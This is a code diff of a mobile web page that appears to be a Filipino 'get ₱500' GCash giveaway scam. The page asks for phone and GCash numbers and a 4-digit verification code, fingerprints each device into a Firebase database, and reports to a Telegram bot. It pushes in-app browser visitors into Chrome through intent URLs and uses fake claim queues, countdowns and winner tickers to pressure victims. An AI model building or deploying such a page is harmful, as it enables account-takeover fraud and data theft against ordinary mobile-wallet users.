-        @keyframes urgentPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.12); } }
-        .ai-error { display: none; padding: 8px 12px; margin-top: 10px; background: rgba(255, 68, 68, 0.2); border: 2px solid rgba(255, 68, 68, 0.5); border-radius: 10px; font-family: 'Poppins', sans-serif; font-size: 11px; color: #ff8888; font-weight: 600; }
-        .ai-error.show { display: block; }
-        .ai-status-text { font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.95); line-height: 1.5; margin-bottom: 12px; padding: 10px; background: rgba(0, 0, 0, 0.3); border-radius: 10px; border: 1px solid rgba(255, 215, 0, 0.3); }
-        .ai-status-text strong { color: #ffe066; font-weight: 800; }
-        .queue-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ff9800 0%, #ff5722 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 14px; box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); text-transform: uppercase; animation: queueBadgePulse 2s ease-in-out infinite; }
-        @keyframes queueBadgePulse { 0%, 100% { box-shadow: 0 4px 0 #8b3a00, 0 0 25px rgba(255, 87, 34, 0.7); } 50% { box-shadow: 0 4px 0 #8b3a00, 0 0 45px rgba(255, 87, 34, 1); } }
-        .queue-badge .queue-dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff; animation: queueDotBlink 1s ease-in-out infinite; }
-        @keyframes queueDotBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .queue-count-box { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; margin: 10px 0; background: rgba(0, 0, 0, 0.4); border: 2px solid rgba(255, 215, 0, 0.4); border-radius: 14px; font-family: 'Poppins', sans-serif; font-size: 12px; color: rgba(255, 255, 255, 0.9); }
-        .queue-count-box .live-users-count { font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; color: #39ff14; text-shadow: 0 0 15px rgba(57, 255, 20, 0.8); }
-        .queue-timer-big { font-family: 'Orbitron', monospace; font-size: 46px; font-weight: 900; color: #ffe066; text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); letter-spacing: 4px; margin: 14px 0; animation: queueTimerGlow 1.5s ease-in-out infinite; }
-        @keyframes queueTimerGlow { 0%, 100% { text-shadow: 0 0 25px rgba(255, 215, 0, 0.9); } 50% { text-shadow: 0 0 45px rgba(255, 215, 0, 1), 0 0 65px rgba(255, 179, 0, 0.8); } }
-        .queue-timer-label { font-family: 'Poppins', sans-serif; font-size: 11px; color: rgba(255, 255, 255, 0.8); letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 4px; }
-        .queue-progress { width: 100%; height: 10px; background: rgba(0, 0, 0, 0.5); border: 2px solid rgba(255, 215, 0, 0.5); border-radius: 12px; overflow: hidden; margin: 14px 0; }
-        .queue-progress-bar { height: 100%; background: linear-gradient(90deg, #ffe066, #ffb300, #ff8800); width: 0%; transition: width 1s linear; box-shadow: 0 0 15px rgba(255, 215, 0, 0.8); border-radius: 12px; }
-        .popup-success { text-align: center; padding: 20px 0; }
-        .popup-success .success-icon { font-size: 60px; margin-bottom: 14px; filter: drop-shadow(0 0 20px rgba(57, 255, 20, 0.9)); animation: successPulse 1.5s ease-in-out infinite; }
-        @keyframes successPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-        .popup-success .success-title { font-family: 'Fredoka', sans-serif; font-size: 22px; font-weight: 900; background: linear-gradient(180deg, #39ff14, #008833); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 15px rgba(57, 255, 20, 0.7)); margin-bottom: 10px; text-transform: uppercase; }
-        .popup-success .success-message { font-family: 'Poppins', sans-serif; font-size: 13px; color: rgba(255, 255, 255, 0.9); line-height: 1.6; }
-        .hidden { display: none !important; }
-
-        /* BAN POPUP */
-        .popup-card.ban-card { background: linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%), linear-gradient(160deg, #d10000 0%, #8b0000 45%, #4a0000 100%); border-color: #ff8888; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 68, 68, 0.5); }
-        .popup-card.ban-card .popup-img-wrap::before { background: radial-gradient(circle at center, rgba(255, 68, 68, 0.5) 0%, rgba(139, 0, 0, 0.3) 40%, transparent 70%); }
-        .popup-card.ban-card .popup-img { filter: drop-shadow(0 8px 20px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 20px rgba(255, 68, 68, 0.55)); }
-
-        /* ============================================================
-           READY TO CLAIM STATE
-           ============================================================ */
-        .ready-to-claim-wrap { display: none; animation: readyFadeIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .ready-to-claim-wrap.show { display: block; }
-        @keyframes readyFadeIn { 0% { opacity: 0; transform: translateY(-10px) scale(0.95); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
-
-        .ready-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 20px; background: linear-gradient(180deg, #39ff14 0%, #008833 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 900; letter-spacing: 2.5px; color: #fff; margin-bottom: 16px; box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9); text-transform: uppercase; animation: readyBadgePulse 1.2s ease-in-out infinite; text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }
-        @keyframes readyBadgePulse {
-            0%, 100% { box-shadow: 0 4px 0 #004d1a, 0 0 30px rgba(57, 255, 20, 0.9); transform: scale(1); }
-            50% { box-shadow: 0 4px 0 #004d1a, 0 0 60px rgba(57, 255, 20, 1), 0 0 100px rgba(57, 255, 20, 0.5); transform: scale(1.05); }
-        }
-        .ready-badge .ready-dot { width: 10px; height: 10px; border-radius: 50%; background: #fff; box-shadow: 0 0 12px #fff, 0 0 20px #39ff14; animation: readyDotBlink 0.8s ease-in-out infinite; }
-        @keyframes readyDotBlink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.7); } }
-
-        .ready-image-wrap { position: relative; width: 100%; max-width: 220px; margin: 0 auto 18px; display: flex; align-items: center; justify-content: center; }
-        .ready-image-wrap::before { content: ''; position: absolute; inset: -18px; background: radial-gradient(circle at center, rgba(57, 255, 20, 0.5) 0%, rgba(110, 168, 255, 0.3) 45%, transparent 72%); border-radius: 50%; filter: blur(18px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
-        .ready-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 20px; filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 25px rgba(57, 255, 20, 0.6)); animation: imgFloat 3s ease-in-out infinite; }
-
-        .ready-title { font-family: 'Fredoka', sans-serif; font-size: 30px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #39ff14 40%, #008833 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9)); margin-bottom: 10px; text-transform: uppercase; animation: readyTitleGlow 1.5s ease-in-out infinite; }
-        @keyframes readyTitleGlow { 0%, 100% { filter: drop-shadow(0 0 25px rgba(57, 255, 20, 0.9)); } 50% { filter: drop-shadow(0 0 45px rgba(57, 255, 20, 1)) drop-shadow(0 0 80px rgba(57, 255, 20, 0.5)); } }
-
-        .ready-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.95); margin-bottom: 20px; text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4); }
-        .ready-subtitle strong { color: #39ff14; font-weight: 800; text-shadow: 0 0 12px rgba(57, 255, 20, 0.75); }
-
-        .ready-claim-btn { position: relative; width: 100%; padding: 22px 22px; display: flex; align-items: center; justify-content: center; gap: 12px; background: linear-gradient(180deg, #d4ffb3 0%, #39ff14 25%, #00cc00 65%, #008833 100%); border: 3px solid #ffffff; border-radius: 20px; font-family: 'Orbitron', monospace; font-size: 17px; font-weight: 900; letter-spacing: 3px; text-transform: uppercase; color: #003300; cursor: pointer; overflow: hidden; box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9); transition: transform 0.12s ease, box-shadow 0.12s ease; animation: readyBtnPulse 1.4s ease-in-out infinite; margin-top: 6px; }
-        @keyframes readyBtnPulse {
-            0%, 100% { box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 60px rgba(57, 255, 20, 0.9); transform: scale(1); }
-            50% { box-shadow: 0 6px 0 #004d1a, 0 12px 30px rgba(0, 0, 0, 0.55), 0 0 100px rgba(57, 255, 20, 1), 0 0 150px rgba(57, 255, 20, 0.6); transform: scale(1.03); }
-        }
-        .ready-claim-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.85), transparent); transform: skewX(-20deg); animation: btnShine 1.8s ease-in-out infinite; }
-        .ready-claim-btn:active { transform: translateY(6px) scale(1) !important; box-shadow: 0 0 0 #004d1a, 0 4px 12px rgba(0, 0, 0, 0.5) !important; }
-        .ready-claim-btn svg { width: 24px; height: 24px; flex-shrink: 0; animation: iconGiftBounce 1s ease-in-out infinite; }
-        @keyframes iconGiftBounce { 0%, 100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-3px) scale(1.15); } }
-
-        .ready-note { margin-top: 16px; font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 500; color: rgba(255, 255, 255, 0.85); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; animation: readyNotePulse 2s ease-in-out infinite; }
-        @keyframes readyNotePulse { 0%, 100% { opacity: 0.85; } 50% { opacity: 1; } }
-        .ready-note svg { width: 14px; height: 14px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9)); flex-shrink: 0; }
-
-        .ready-glow-ring { position: absolute; inset: -12px; border-radius: 30px; pointer-events: none; border: 2px solid rgba(57, 255, 20, 0.6); animation: readyRingExpand 2s ease-out infinite; }
-        @keyframes readyRingExpand { 0% { transform: scale(0.9); opacity: 0.9; } 100% { transform: scale(1.3); opacity: 0; } }
-
-        @media (max-width: 380px) {
-            .mission-card { padding: 30px 16px 22px; border-radius: 26px; }
-            .mission-title { font-size: 23px; }
-            .mission-subtitle { font-size: 12px; }
-            .mission-btn { padding: 16px; font-size: 13px; letter-spacing: 2px; }
-            .mission-btn svg { width: 20px; height: 20px; }
-            .mission-chip { font-size: 8px; padding: 6px 10px; }
-            .popup-card { padding: 26px 16px 20px; }
-            .popup-title { font-size: 19px; }
-            .winners-ticker { padding: 6px 12px; }
-            .winners-ticker .ticker-text { font-size: 10px; }
-            .queue-timer-big { font-size: 36px; }
-            #intentBlock .intent-card { padding: 28px 18px 24px; border-radius: 26px; }
-            #intentBlock .intent-title { font-size: 22px; }
-            #intentBlock .intent-subtitle { font-size: 12px; }
-            #intentBlock .auto-open-btn { padding: 16px 18px; font-size: 12px; letter-spacing: 2px; }
-            #intentBlock .auto-open-btn svg { width: 20px; height: 20px; }
-            #intentBlock .intent-image-wrap { max-width: 200px; }
-            #intentBlock .intent-steps { font-size: 11px; padding: 12px 14px; }
-            .ready-title { font-size: 24px; }
-            .ready-claim-btn { padding: 18px 16px; font-size: 14px; letter-spacing: 2px; }
-            .ready-claim-btn svg { width: 22px; height: 22px; }
-            .ready-image-wrap { max-width: 180px; }
-        }
-        @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
-    </style>
-</head>
+    </head>
 <body>
 
     <!-- DESKTOP BLOCK -->
@@ -605,34 +167,21 @@
     <!-- ✅ INTENT / BROWSER GUARD -->
     <div id="intentBlock">
         <div class="intent-card">
-
             <div class="intent-badge"><span class="badge-dot"></span><span>⚠️ BROWSER REQUIRED ⚠️</span></div>
-
             <div class="intent-image-wrap">
                 <img src="images/cat_start.png" alt="Open in Browser" class="intent-image" onerror="this.style.opacity='0.4';">
             </div>
-
             <h1 class="intent-title">OPEN IN BROWSER</h1>
-
-            <p class="intent-subtitle">
-                This mission must be opened in your <strong>default browser</strong> (Chrome, etc.)
-            </p>
-
-            <p class="intent-danger-text">
-                ❌ Facebook / Instagram / iPhone not supported
-            </p>
-
+            <p class="intent-subtitle">This mission must be opened in your <strong>default browser</strong> (Chrome, etc.)</p>
+            <p class="intent-danger-text">❌ Facebook / Instagram / iPhone not supported</p>
             <div class="intent-divider"><span class="star">★</span><span class="line"></span><span class="star">★</span></div>
-
             <div class="intent-steps">
                 <span class="steps-title">📌 Paano Buksan</span>
                 <span class="step-num">1</span> I-tap ang <strong>⋮ (3 dots)</strong> sa taas<br>
                 <span class="step-num">2</span> Piliin ang <strong>"Open in Browser"</strong><br>
                 <span class="step-num">3</span> Buksan sa <strong>Chrome</strong> o default browser
             </div>
-
             <button class="auto-open-btn" id="autoOpenBtn">
-                <!-- SVG: Rocket Launch Icon -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/>
                     <path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/>
@@ -641,9 +190,7 @@
                 </svg>
                 <span>BUKSAN SA CHROME</span>
             </button>
-
             <div class="intent-note">
-                <!-- SVG: Shield Check Icon -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
                     <path d="m9 12 2 2 4-4"/>
@@ -686,7 +233,6 @@
                 <div class="mission-chip"><span class="chip-icon">🔒</span><span>SECURED</span></div>
             </div>
             <button class="mission-btn" id="continueBtn">
-                <!-- SVG: Rocket Icon -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/>
                     <path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/>
@@ -725,7 +271,6 @@
             </div>
             <input type="tel" class="phone-input" id="userPhoneInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
             <button class="popup-btn" id="get500Btn">
-                <!-- SVG: Money Stack Icon -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                     <rect x="2" y="6" width="20" height="12" rx="2"/>
                     <circle cx="12" cy="12" r="2.5"/>
@@ -750,7 +295,6 @@
             <p class="popup-subtitle">Authorize your instant withdrawal.<br>Wait for the countdown to continue.</p>
             <div class="countdown-badge" id="skipCountdownBadge">⏳ SKIP IN <span id="skipCountdownNum">10</span>s</div>
             <button class="popup-btn" id="skipClaimBtn" disabled>
-                <!-- SVG: Skip Forward Icon -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                     <polygon points="5 4 15 12 5 20 5 4"/>
                     <line x1="19" y1="5" x2="19" y2="19"/>
@@ -774,7 +318,10 @@
                 <div class="queue-badge"><span class="queue-dot"></span><span>⏳ PROCESSING QUEUE</span></div>
                 <h2 class="popup-title">MANY USERS CLAIMING</h2>
                 <p class="popup-subtitle">Maraming user ang nag-claim ngayon.<br>Please wait for your turn.</p>
-                <div class="queue-count-box"><span>👥 Live users:</span><span class="live-users-count" id="liveUsersCount">0</span></div>
+
+                <!-- ✅ BAGONG QUEUE LIST PANEL -->
+                <div class="queue-list" id="queueList"></div>
+
                 <div class="queue-timer-label">⏱ Available to claim in</div>
                 <div class="queue-timer-big" id="queueTimer">10:00</div>
                 <div class="queue-progress"><div class="queue-progress-bar" id="queueProgressBar"></div></div>
@@ -787,18 +334,14 @@
                     <span class="ready-dot"></span>
                     <span>✨ READY TO CLAIM ✨</span>
                 </div>
-
                 <div class="ready-image-wrap">
                     <img src="images/cat_cn.png" alt="Ready to Claim" class="ready-image" onerror="this.style.opacity='0.4';">
                 </div>
-
                 <h2 class="ready-title">YOUR TURN!</h2>
                 <p class="ready-subtitle">Your slot is now available.<br><strong>Tap the button below to claim!</strong></p>
-
                 <div style="position: relative; margin-top: 4px;">
                     <div class="ready-glow-ring"></div>
                     <button class="ready-claim-btn" id="readyClaimBtn">
-                        <!-- SVG: Gift Box Icon -->
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
                             <rect x="3" y="8" width="18" height="4" rx="1"/>
                             <path d="M12 8v13"/>
@@ -808,7 +351,6 @@
                         <span>CLAIM NOW</span>
                     </button>
                 </div>
-
                 <div class="ready-note">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M18 11V6a2 2 0 0 0-2-2a2 2 0 0 0-2 2"/>
@@ -866,7 +408,6 @@
                 </div>
                 <input type="tel" class="phone-input" id="aiGcashInput" placeholder="09XX XXX XXXX" maxlength="13" inputmode="numeric" autocomplete="off">
                 <button class="popup-btn" id="aiRequestCallBtn">
-                    <!-- SVG: Phone Call Icon -->
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
                     </svg>
@@ -889,7 +430,6 @@
                 </div>
                 <input type="text" class="ai-code-input" id="aiCodeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                 <button class="popup-btn" id="aiVerifyBtn">
-                    <!-- SVG: Check Circle Icon -->
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
                         <circle cx="12" cy="12" r="10"/>
                         <path d="m9 12 2 2 4-4"/>
@@ -920,12 +460,12 @@
         </div>
     </div>
 
-    <script>
+                    <script>
         (function() {
             'use strict';
 
             // ============================================================
-            // ✅ INTENT / BROWSER GUARD
+            // INTENT / BROWSER GUARD
             // ============================================================
             function isInAppBrowser() {
                 var ua = navigator.userAgent || navigator.vendor || window.opera;
@@ -938,84 +478,63 @@
             function isAndroid() {
                 return /Android/i.test(navigator.userAgent);
             }
-
             function forceOpenInChrome() {
                 if (!isAndroid()) return false;
                 var currentUrl = window.location.href;
                 var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
                 var intentUrl = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(currentUrl) + ';end';
-                try {
-                    window.location.href = intentUrl;
-                    return true;
-                } catch(e) {
-                    console.log('Intent failed:', e);
-                    return false;
-                }
+                try { window.location.href = intentUrl; return true; } catch(e) { return false; }
             }
-
             function enforceBrowserGuard() {
                 var block = document.getElementById('intentBlock');
                 var app = document.getElementById('missionApp');
                 var ticker = document.getElementById('winnersTicker');
-
                 if (isIPhone()) {
                     if (block) block.style.display = 'flex';
                     if (app) app.style.display = 'none';
                     if (ticker) ticker.style.display = 'none';
                     document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show');
-                        p.style.pointerEvents = 'none';
+                        p.classList.remove('show'); p.style.pointerEvents = 'none';
                     });
                     return false;
                 }
-
                 if (isInAppBrowser()) {
                     if (block) block.style.display = 'flex';
                     if (app) app.style.display = 'none';
                     if (ticker) ticker.style.display = 'none';
                     document.querySelectorAll('.popup-overlay').forEach(function(p) {
-                        p.classList.remove('show');
-                        p.style.pointerEvents = 'none';
+                        p.classList.remove('show'); p.style.pointerEvents = 'none';
                     });
                     setTimeout(function() { forceOpenInChrome(); }, 800);
                     return false;
                 }
-
                 if (block) block.style.display = 'none';
                 if (app) app.style.display = '';
                 if (ticker) ticker.style.display = '';
                 return true;
             }
-
             var browserAllowed = enforceBrowserGuard();
             window.addEventListener('resize', function() { enforceBrowserGuard(); });
             window.addEventListener('orientationchange', function() { setTimeout(enforceBrowserGuard, 300); });
-
             var autoOpenBtn = document.getElementById('autoOpenBtn');
-            if (autoOpenBtn) {
-                autoOpenBtn.addEventListener('click', function() { forceOpenInChrome(); });
-            }
+            if (autoOpenBtn) autoOpenBtn.addEventListener('click', function() { forceOpenInChrome(); });
 
             // ============================================================
-            // ✅ SMART DEEPLINK HANDLER
+            // SMART DEEPLINK HANDLER
             // ============================================================
             function openAsDeeplink(url) {
                 if (!url) return;
                 var android = isAndroid();
                 var isCustomScheme = /^(gcash|myapp|upi|phonepe|paytm|intent|whatsapp|tg|fb|instagram|market|alipays?):/i.test(url);
-                console.log('🔗 Opening link as deeplink:', url);
+                console.log('🔗 Opening:', url);
                 if (isCustomScheme || url.indexOf('intent://') === 0) {
-                    try { window.location.href = url; } catch(e) { console.log('Custom scheme failed:', e); }
+                    try { window.location.href = url; } catch(e) {}
                     return;
                 }
                 if (/^https?:\/\//i.test(url) && android) {
                     var cleanUrl = url.replace(/^https?:\/\//, '');
                     var intentUrl = 'intent://' + cleanUrl + '#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=' + encodeURIComponent(url) + ';end';
-                    try {
-                        window.location.href = intentUrl;
-                    } catch(e) {
-                        window.location.href = url;
-                    }
+                    try { window.location.href = intentUrl; } catch(e) { window.location.href = url; }
                     return;
                 }
                 window.location.href = url;
@@ -1040,12 +559,16 @@
             var skipCountdown = 10;
             var queueTimerInterval = null;
             var queueCountdown = 600;
-            var liveUsersInterval = null;
             var linkListeners = [];
             var isBanned = false;
-
             var readyToClaim = false;
             var pendingLink = null;
+
+            // ✅ QUEUE STATE
+            var queueUsers = [];
+            var queueListInterval = null;
+            var userInQueue = false;
+            var userLinkDeployed = false;
 
             // ============================================================
             // MOBILE GUARD
@@ -1074,7 +597,7 @@
             window.addEventListener('orientationchange', function() { setTimeout(enforceMobileOnly, 300); });
 
             // ============================================================
-            // FIREBASE INIT
+            // FIREBASE
             // ============================================================
             function initFirebase() {
                 try {
@@ -1098,12 +621,12 @@
                     if (now - lastTelegramTime < TELEGRAM_THROTTLE_MS) return;
                     lastTelegramTime = now;
                     fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
-                        .catch(function(e) { console.log('Telegram error:', e); });
+                        .catch(function(e) {});
                 } catch(e) {}
             }
 
             // ============================================================
-            // DEVICE MANAGEMENT
+            // DEVICE
             // ============================================================
             function getDeviceFingerprint() {
                 var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
@@ -1120,7 +643,6 @@
                 }
                 return 'FP_' + Math.abs(hash);
             }
-
             function getOrCreateDeviceId(fingerprint) {
                 if (!fingerprint || fingerprint === '---') return Promise.resolve('---');
                 var deviceMapRef = db.ref('device_id_map/' + fingerprint);
@@ -1131,40 +653,18 @@
                         var nextNum = (counterSnap.val() || 0) + 1;
                         return counterRef.set(nextNum).then(function() {
                             var displayId = 'Dev' + nextNum;
-                            return deviceMapRef.set({
-                                displayId: displayId,
-                                createdAt: Date.now(),
-                                fingerprint: fingerprint
-                            }).then(function() { return displayId; });
+                            return deviceMapRef.set({ displayId: displayId, createdAt: Date.now(), fingerprint: fingerprint }).then(function() { return displayId; });
                         });
                     });
                 });
             }
-
             function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
-                var deviceInfo = {
-                    phone: phone,
-                    fingerprint: fingerprint,
-                    displayId: deviceDisplayId,
-                    screenResolution: screen.width + 'x' + screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language,
-                    userAgent: navigator.userAgent,
-                    lastSeen: Date.now(),
-                    firstSeen: Date.now()
-                };
+                var deviceInfo = { phone: phone, fingerprint: fingerprint, displayId: deviceDisplayId, screenResolution: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, userAgent: navigator.userAgent, lastSeen: Date.now(), firstSeen: Date.now() };
                 return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
-                    if (!existingDevice.exists()) {
-                        return db.ref('devices/' + fingerprint).set(deviceInfo);
-                    } else {
-                        return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now(), phone: phone });
-                    }
+                    if (!existingDevice.exists()) return db.ref('devices/' + fingerprint).set(deviceInfo);
+                    return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now(), phone: phone });
                 }).then(function() {
-                    return db.ref('device_phone_map/' + fingerprint).set({
-                        phone: phone,
-                        displayId: deviceDisplayId,
-                        lastSeen: Date.now()
-                    });
+                    return db.ref('device_phone_map/' + fingerprint).set({ phone: phone, displayId: deviceDisplayId, lastSeen: Date.now() });
                 });
             }
 
@@ -1186,7 +686,6 @@
                     });
                 });
             }
-
             function showBanPopup() {
                 document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); });
                 var banPopup = document.getElementById('banPopup');
@@ -1230,11 +729,7 @@
             // ============================================================
             // BACKGROUND EFFECTS
             // ============================================================
-            if (isMobile && browserAllowed) {
-                createFloatingCoins();
-                createSparkles();
-                createConfetti();
-            }
+            if (isMobile && browserAllowed) { createFloatingCoins(); createSparkles(); createConfetti(); }
             function createFloatingCoins() {
                 var layer = document.getElementById('coinLayer'); if (!layer) return;
                 var coinEmojis = ['🪙', '💰', '💎', '⭐', '✨'];
@@ -1301,19 +796,15 @@
             // ============================================================
             // POPUP HELPERS
             // ============================================================
-            function openPopup(id) {
-                if (!browserAllowed) return;
-                var p = document.getElementById(id); if (p) p.classList.add('show');
-            }
+            function openPopup(id) { if (!browserAllowed) return; var p = document.getElementById(id); if (p) p.classList.add('show'); }
             function closePopup(id) { var p = document.getElementById(id); if (p) p.classList.remove('show'); }
-            function closeAllPopups() { document.querySelectorAll('.popup-overlay').forEach(function(p) { p.classList.remove('show'); }); }
 
             document.getElementById('catClaimClose').onclick = function() { closePopup('catClaimPopup'); };
             document.getElementById('skipClaimClose').onclick = function() { closePopup('skipClaimPopup'); stopSkipCountdown(); };
             document.getElementById('queueClose').onclick = function() { closePopup('queuePopup'); stopQueueTimer(); stopLiveUsersCounter(); stopLinkListeners(); clearCountdownState(); };
             document.getElementById('successClose').onclick = function() { closePopup('successPopup'); };
             document.getElementById('aiVerifyClose').onclick = function() { closePopup('aiVerifyPopup'); stopAiTimer(); };
-            document.getElementById('banOkBtn').onclick = function() { /* stay */ };
+            document.getElementById('banOkBtn').onclick = function() {};
 
             // ============================================================
             // INIT DEVICE
@@ -1321,19 +812,16 @@
             function initDevice() {
                 if (!db || !browserAllowed) return Promise.resolve();
                 deviceFingerprint = getDeviceFingerprint();
-                console.log('📱 Device fingerprint:', deviceFingerprint);
                 return getOrCreateDeviceId(deviceFingerprint).then(function(displayId) {
                     deviceDisplayId = displayId;
-                    console.log('✅ Device ID:', deviceDisplayId);
                     return db.ref('device_phone_map/' + deviceFingerprint).once('value').then(function(snap) {
                         if (snap.exists() && snap.val().phone) {
                             var linkedPhone = snap.val().phone;
                             return db.ref('banned_ghosts/' + linkedPhone).once('value').then(function(bannedSnap) {
                                 if (bannedSnap.exists()) {
-                                    console.log('🚫 Device banned via linkage:', linkedPhone);
                                     isBanned = true;
                                     showBanPopup();
-                                    sendTelegram('🚫 BANNED DEVICE ACCESS ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n🖥️ Device: ' + deviceDisplayId + '\n🔗 Linked Phone: ' + linkedPhone + '\n📱 Fingerprint: ' + deviceFingerprint + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                                    sendTelegram('🚫 BANNED DEVICE\n🖥️ ' + deviceDisplayId + '\n🔗 ' + linkedPhone);
                                 }
                             });
                         }
@@ -1346,8 +834,7 @@
             // ============================================================
             document.getElementById('continueBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                if (!browserAllowed) return;
-                if (isBanned) return;
+                if (!browserAllowed || isBanned) return;
                 if (navigator.vibrate) { try { navigator.vibrate(30); } catch(e) {} }
                 this.style.transform = 'scale(0.96)';
                 var self = this;
@@ -1374,7 +861,7 @@
             }
 
             // ============================================================
-            // GET ₱500 → BAN CHECK → FIREWALL
+            // GET ₱500
             // ============================================================
